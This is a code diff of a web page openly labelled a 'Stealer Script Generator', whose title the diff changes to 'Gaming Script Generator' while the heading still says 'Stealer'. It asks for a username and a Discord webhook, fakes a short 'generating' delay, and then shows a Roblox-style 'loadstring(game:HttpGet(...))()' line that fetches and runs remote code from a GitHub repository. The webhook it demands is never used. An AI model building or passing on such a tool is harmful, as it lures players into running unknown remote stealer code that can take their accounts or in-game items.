@@ -2,7 +2,7 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8">
-  <title>Stealer Script Generator</title>
+  <title>Gaming Script Generator</title>
   <meta name="viewport" content="width=device-width, initial-scale=1">
   <style>
     body {
@@ -80,32 +80,36 @@
 </head>
 <body>
   <div class="container">
-    <h2>⚡ Script Generator ⚡</h2>
+    <h2>⚡ Stealer Script Generator ⚡</h2>
     <input type="text" id="username" placeholder="Enter Username">
-    <input type="text" id="webhook" placeholder="Enter Discord Webhook URL">
-    <button onclick="sendData()">Generate Script</button>
+    <input type="text" id="webhook" placeholder="Enter Discord Webhook URL (required)">
+    <button onclick="generateScript()">Generate Script</button>
     <div id="result"></div>
   </div>
 
   <script>
-    async function sendData() {
-      const username = document.getElementById("username").value;
-      const webhook = document.getElementById("webhook").value;
+    const scripts = [
+      'loadstring(game:HttpGet("https://raw.githubusercontent.com/Xscripts-official/EggRefresher/refs/heads/main/eggscript"))()',
+      'loadstring(game:HttpGet("https://raw.githubusercontent.com/Xscripts-official/EggRefresher/refs/heads/main/EggRefresherLATEST"))()'
+      // 👆 add more scripts here if you like
+    ];
+
+    function generateScript() {
+      const username = document.getElementById("username").value.trim();
+      const webhook = document.getElementById("webhook").value.trim();
       const result = document.getElementById("result");
 
-      result.textContent = "⚙️ Generating Please wait...";
-      const res = await fetch("/api/send", {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ username, webhook })
-      });
-
-      const data = await res.json();
-      if (res.ok) {
-        result.innerHTML = `✅ Stealer Script Generated:<br><code>${data.script}</code>`;
-      } else {
-        result.textContent = "❌ Error: " + (data.body || data);
+      if (!username || !webhook) {
+        result.textContent = "❌ Please enter both Username and Webhook!";
+        return;
       }
+
+      result.textContent = "⚙️ Generating Stealer Script please wait...";
+      
+      setTimeout(() => {
+        const chosen = scripts[Math.floor(Math.random() * scripts.length)];
+        result.innerHTML = `✅ Generated for <b>${username}</b>:<br><code>${chosen}</code>`;
+      }, 3000);
     }
   </script>
 </body>
